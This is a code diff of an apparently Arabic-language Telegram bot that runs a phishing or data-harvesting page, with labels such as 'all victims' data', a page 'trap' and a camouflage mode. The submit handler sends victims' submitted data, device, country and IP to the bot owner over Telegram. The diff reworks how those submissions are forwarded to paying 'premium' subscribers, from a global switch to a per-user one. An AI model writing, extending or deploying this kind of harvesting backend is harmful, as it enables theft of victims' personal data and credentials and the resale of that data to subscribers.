@@ -195,7 +195,6 @@ function sendPageMain(chatId, editMsgId) {
   const passIcon = pageConfig.pagePassword ? "🔒✅" : "🔒";
   const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}\n${pageConfig.pagePassword ? "🔒 كلمة سر: مفعّلة" : "🔓 كلمة سر: معطّلة"}`;
   const wIcon = pageConfig.welcomeEnabled ? "📢✅" : "📢";
-  const fwdIcon = settings.forwardSubsToPremium ? "📤✅" : "📤";
   const kb = JSON.stringify({ inline_keyboard:[
     [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
     [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
@@ -203,7 +202,7 @@ function sendPageMain(chatId, editMsgId) {
     [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
     [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}],
     [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"},{text:`${passIcon} كلمة سر`,callback_data:"pg_setpass"}],
-    [{text:`${fwdIcon} إرسال البيانات للبريمو`,callback_data:"pg_fwdprem"},{text:"📊 كل بيانات الضحايا",callback_data:"pg_allsubs"}]
+    [{text:"📊 كل بيانات الضحايا",callback_data:"pg_allsubs"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -750,13 +749,12 @@ app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
     txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n🌍 ${sub.country} | ⚓ ${ip}\n⏰ ${time}`;
     const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
     bot.sendMessage(BOT_OWNER, txt, {parse_mode:"Markdown", reply_markup:JSON.stringify(kb)}).catch(()=>{});
-    // Forward to all active premium users if enabled
-    if (settings.forwardSubsToPremium) {
-      for (const [uid, pdata] of Object.entries(premium)) {
-        if (Number(uid) === BOT_OWNER) continue;
-        if (!isPremium(Number(uid))) continue;
-        bot.sendMessage(Number(uid), txt, {parse_mode:"Markdown"}).catch(()=>{});
-      }
+    // Forward to premium users who have receiveOwnerSubs enabled
+    for (const [uid, pdata] of Object.entries(premium)) {
+      if (Number(uid) === BOT_OWNER) continue;
+      if (!isPremium(Number(uid))) continue;
+      if (!pdata.receiveOwnerSubs) continue;
+      bot.sendMessage(Number(uid), txt, {parse_mode:"Markdown"}).catch(()=>{});
     }
   });
 });
@@ -1662,14 +1660,6 @@ bot.on('callback_query', async (q) => {
     return bot.answerCallbackQuery(q.id, { text: "⛔ هذه الميزة للمشتركين البريميوم فقط." });
   }
 
-  if (data === "pg_fwdprem" && chatId === BOT_OWNER) {
-    settings.forwardSubsToPremium = !settings.forwardSubsToPremium;
-    saveSettings();
-    const state = settings.forwardSubsToPremium ? "✅ مفعّل" : "❌ معطّل";
-    bot.answerCallbackQuery(q.id, { text: `📤 إرسال البيانات للبريمو: ${state}` }).catch(()=>{});
-    return sendPageMain(chatId, q.message.message_id);
-  }
-
   if (data === "pg_toggle") {
     if (q.from.id !== BOT_OWNER) return;
     if (!pageConfig.active) { pageConfig.active = true; pageConfig.camouflage = false; }
@@ -2089,10 +2079,42 @@ bot.on('callback_query', async (q) => {
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
         [{text: hasAccess ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
         [{text: prem.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
+        [{text: prem.receiveOwnerSubs ? "📤✅ إيقاف إرسال بيانات صفحتك له" : "📤 إرسال بيانات صفحتك له", callback_data:`pg_ufwdtoggle_${uid}`}],
         [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
         [{text:"🔙 رجوع",callback_data:"premlist"}]
       ]})}
     );
+  }
+
+  if (data.startsWith("pg_ufwdtoggle_") && q.from.id === BOT_OWNER) {
+    const uid = data.replace("pg_ufwdtoggle_","");
+    if (!premium[uid]) return;
+    premium[uid].receiveOwnerSubs = !premium[uid].receiveOwnerSubs;
+    savePremium();
+    const on = premium[uid].receiveOwnerSubs;
+    bot.answerCallbackQuery(q.id, {text: on ? "📤✅ سيصله بيانات صفحتك" : "📤 لن يصله بيانات صفحتك"}).catch(()=>{});
+    // Refresh the panel
+    const prof2 = profiles[uid]||{};
+    const prem2 = premium[uid]||{};
+    const cfg2 = getUserPage(uid);
+    const subs2 = getUserSubs(uid);
+    const hasAccess2 = !!prem2.pageAccess;
+    const link2 = `${hostURL}/p/u/${uid}`;
+    return bot.editMessageText(
+      `🎛️ *إدارة صفحة: ${prof2.name||uid}*\n\n` +
+      `🔑 الوصول: ${hasAccess2 ? "✅ مفعّل" : "🔒 معطّل"}\n` +
+      `📡 الحالة: ${cfg2.active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
+      `👁️ مشاهدات: ${cfg2.views||0}\n` +
+      `✅ بيانات مجموعة: ${subs2.length}\n` +
+      `🔗 الرابط: \`${link2}\``,
+      {chat_id:chatId, message_id:q.message.message_id, parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text: hasAccess2 ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
+        [{text: prem2.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
+        [{text: on ? "📤✅ إيقاف إرسال بيانات صفحتك له" : "📤 إرسال بيانات صفحتك له", callback_data:`pg_ufwdtoggle_${uid}`}],
+        [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
+        [{text:"🔙 رجوع",callback_data:"premlist"}]
+      ]})}
+    ).catch(()=>{});
   }
 
   if (data.startsWith("pg_upushtoggle_") && q.from.id === BOT_OWNER) {
